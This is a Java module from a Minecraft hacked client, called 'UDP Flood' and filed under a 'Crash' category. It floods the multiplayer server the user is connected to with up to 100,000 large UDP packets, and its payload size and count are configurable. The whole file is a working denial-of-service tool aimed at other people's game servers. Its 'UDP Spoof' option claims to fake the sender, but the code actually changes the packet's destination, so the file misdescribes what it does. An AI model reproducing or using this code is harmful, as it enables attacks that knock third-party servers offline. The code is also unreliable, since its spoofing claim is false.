package mathax.client.systems.modules.crash;

import mathax.client.eventbus.EventHandler;
import mathax.client.events.game.GameLeftEvent;
import mathax.client.settings.*;
import mathax.client.systems.modules.Categories;
import mathax.client.systems.modules.Module;
import mathax.client.utils.Utils;
import net.minecraft.client.network.ServerAddress;
import net.minecraft.client.network.ServerInfo;
import net.minecraft.item.Items;
import org.jetbrains.annotations.NotNull;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import static mathax.client.MatHax.LOG;

public class UDPFlood extends Module {
    private final Setting<String> payloadString;
    private final Setting<Integer> requestCount;
    private final Setting<Integer> requestRepeatCount;
    private final Setting<Boolean> autoDisable;
    private final Setting<Boolean> UDPSpoof;
    private final Setting<String> spoofedIp;
    private final Setting<Integer> spoofedPort;

    private final boolean shouldSend;

    private final ExecutorService executor = Executors.newSingleThreadExecutor();

    public UDPFlood() {
        super(Categories.Crash, Items.FURNACE_MINECART, "UDP Flood", "CRYSTAL || Floods the server with UDP requests+.");
        SettingGroup sgGeneral = settings.getDefaultGroup();
        payloadString = sgGeneral.add(new StringSetting.Builder()
            .name("Payload")
            .description("The custom payload to be sent to the server.")
            .defaultValue("This server is currently being ran by crystal addon")
            .build());
        requestCount = sgGeneral.add(new IntSetting.Builder()
            .name("Requests")
            .description("The amount of requests to be sent to the server.")
            .sliderMin(1)
            .min(1)
            .sliderMax(100000)
            .defaultValue(100)
            .build());
        requestRepeatCount = sgGeneral.add(new IntSetting.Builder()
            .name("Requests repeat multiplier")
            .description("The number of times your payload string should be duplicated before being sent.")
            .sliderMin(1)
            .min(1)
            .sliderMax(100000)
            .defaultValue(100)
            .build());
        autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("Auto Disable")
            .description("Disables module on kick.")
            .defaultValue(true)
            .build());
        UDPSpoof = sgGeneral.add(new BoolSetting.Builder()
            .name("UDP Spoof")
            .description("Spoofs the details sent in the packet.")
            .defaultValue(false)
            .build());
        spoofedIp = sgGeneral.add(new StringSetting.Builder()
            .name("Spoofed IP")
            .description("The spoofed IP the packet is sent from.")
            .defaultValue("127.0.0.1")
            .visible(UDPSpoof::get)
            .build());
        spoofedPort = sgGeneral.add(new IntSetting.Builder()
            .name("Spoofed Port")
            .description("The spoofed port the packet is sent from.")
            .defaultValue(25565)
            .visible(UDPSpoof::get)
            .sliderMin(0)
            .sliderMax(65535)
            .build());

        shouldSend = false;
    }

    @EventHandler
    public boolean onActivate() {
        if (Utils.canUpdate() && !shouldSend) {
            if (!mc.isInSingleplayer()) {
                if (mc.getCurrentServerEntry() != null) {
                    ServerInfo server = mc.getCurrentServerEntry();
                    try {
                        String serverIp = ServerAddress.parse(server.address).getAddress();
                        int serverPort = ServerAddress.parse(server.address).getPort();
                        info("Starting UDP Flooder on server: " + serverIp + ":" + serverPort);
                        executor.execute(() -> floodServer(serverIp, serverPort));
                    } catch (Exception e) {
                        LOG.error("Error in obtaining server IP: " + e.getMessage());
                        error("Error in obtaining server IP. Please check your connection, toggling.");
                        toggle();
                    }
                } else {
                    LOG.error("Error in UDPFlood, the server is null.");
                    error("The server is null.");
                    toggle();
                }
            } else if (mc.isInSingleplayer()) {
                error("You must be on a server, toggling.");
                toggle();
            }
        }
        return false;
    }

    private void floodServer(String serverIp, int serverPort) {
        int totalDataSent = 0;
        boolean allPacketsSent = true;
        try (DatagramSocket socket = new DatagramSocket()) {
            byte[] payload = payloadString.get().repeat(requestRepeatCount.get()).getBytes(StandardCharsets.UTF_8);

            if (!isValidIpAddress(serverIp)) {
                LOG.error("Invalid server IP: " + serverIp);
                error("Invalid server IP. Please check the IP address. You must be on a server with an IP. Not a domain.");
                toggle();
                return;
            }

            InetAddress serverAddress = InetAddress.getByName(serverIp);

            int i = 0;
            while (i < requestCount.get()) {
                if (i < requestCount.get()) {
                    DatagramPacket packet = new DatagramPacket(payload, payload.length, serverAddress, serverPort);
                    if(UDPSpoof.get()) {
                        packet.setAddress(InetAddress.getByName(spoofedIp.get()));
                        packet.setPort(spoofedPort.get());
                        socket.send(packet);
                    } else {
                        socket.send(packet);
                    }
                    totalDataSent += payload.length;
                    i++;
                } else {
                    break;
                }
            }
        } catch (IOException e) {
            LOG.error("Exception in: " + e);
            error("Error occurred: " + e + ", toggling.");
            allPacketsSent = false;
            toggle();
        }

        if (allPacketsSent) {
            info(" - UDP- ");
            info("Server IP: " + serverIp);
            info("Server Port: " + serverPort);
            info("Total data sent: " + formatData(totalDataSent));
            toggle();
        }
    }


    private boolean isValidIpAddress(@NotNull String ipAddress) {
        String[] parts = ipAddress.split("\\.");
        if (parts.length != 4) {
            return false;
        }

        for (String part : parts) {
            try {
                int num = Integer.parseInt(part);
                if (num < 0 || num > 255) {
                    return false;
                }
            } catch (NumberFormatException e) {
                return false;
            }
        }
        return true;
    }


    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) {
            toggle();
        }
    }

    private String formatData(long bytes) {
        double kilobytes = bytes / 1000.0;
        double megabytes = kilobytes / 1000.0;
        double gigabytes = megabytes / 1000.0;

        if (gigabytes >= 1.0) {
            return String.format("%.2f GB", gigabytes);
        } else if (megabytes >= 1.0) {
            return String.format("%.2f MB", megabytes);
        } else if (kilobytes >= 1.0) {
            return String.format("%.2f KB", kilobytes);
        } else {
            return bytes + " bytes";
        }
    }
}
